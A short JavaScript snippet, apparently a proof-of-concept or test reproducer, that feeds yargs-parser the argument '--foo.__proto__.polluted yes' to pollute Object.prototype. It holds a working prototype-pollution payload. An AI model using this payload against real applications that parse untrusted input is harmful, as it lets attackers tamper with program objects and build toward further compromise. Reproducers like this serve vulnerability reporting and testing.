
const parser = require("yargs-parser");
Object.prototype._polluted = [1]
parser("--foo.__proto__.polluted yes", { 
  configuration: {
    'duplicate-arguments-array': false 
  }
});
